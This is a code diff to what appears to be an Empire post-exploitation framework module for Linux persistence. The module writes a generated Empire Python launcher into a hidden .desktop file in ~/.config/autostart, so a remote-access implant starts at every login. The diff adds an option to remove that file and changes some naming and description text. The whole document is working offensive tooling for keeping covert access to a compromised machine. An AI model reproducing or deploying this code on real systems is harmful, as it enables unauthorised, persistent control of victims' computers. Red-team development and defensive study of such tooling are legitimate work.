@@ -12,7 +12,7 @@ class Module:
             'Author': ['@jarrodcoulter'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an Empire launcher script in ~/.config/autostart.'),
+            'Description': ('Installs an Empire launcher script in ~/.config/autostart on Linux versions with GUI.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -34,7 +34,7 @@ class Module:
 
             # list of any references/other comments
             'Comments': [https://digitasecurity.com/blog/2018/01/23/crossrat/
-            https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, 
+            https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, 	
             https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/]
         }
 
@@ -53,11 +53,16 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Remove' : {
+                'Description'   :   'Remove Persistence based on FileName. True/False',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
             'FileName' : {
                 'Description'   :   'File name without extension that you would like created in ~/.config/autostart/ folder.',
                 'Required'      :   False,
                 'Value'         :   'sec_start'
-            },
+            }
 
         }
 
@@ -77,8 +82,8 @@ class Module:
                     self.options[option]['Value'] = value
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        FileName = self.options['FileName']['Value']
+        remove = self.options['Remove']['Value']
+        fileName = self.options['FileName']['Value']
         listenerName = self.options['Listener']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
         launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
@@ -88,27 +93,36 @@ Name=%s
 Exec=python -c %s
 Type=Application
 NoDisplay=True
-""" % (FileName, launcher)
+""" % (fileName, launcher)
         script = """
 import subprocess
 import sys
 import os
+remove = "%s"
 dtFile = \"\"\"
 %s
 \"\"\"
 home = os.path.expanduser("~")
-FilePath = home + "/.config/autostart/"
-WriteFile = FilePath + "%s.desktop"
+filePath = home + "/.config/autostart/"
+writeFile = filePath + "%s.desktop"
 
-if not os.path.exists(FilePath):
-    os.makedirs(FilePath)
-e = open(WriteFile,'wb')
-e.write(dtFile)
-e.close()
+if remove.lower() == "true":
+    if os.path.isfile(writeFile):
+        os.remove(writeFile)
+        print "\\n[+] Persistence has been removed"
+    else:
+        print "\\n[-] Persistence file does not exist, nothing removed"
 
-print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
-print "\\n[+] Empire daemon has been written to %s"
+else:
+    if not os.path.exists(filePath):
+        os.makedirs(filePath)
+    e = open(writeFile,'wb')
+    e.write(dtFile)
+    e.close()
 
-""" % (dtSettings, FileName, FileName, FileName)
+    print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
+    print "\\n[+] Empire daemon has been written to %s"
+
+""" % (remove, dtSettings, fileName, fileName, fileName)
 
         return script
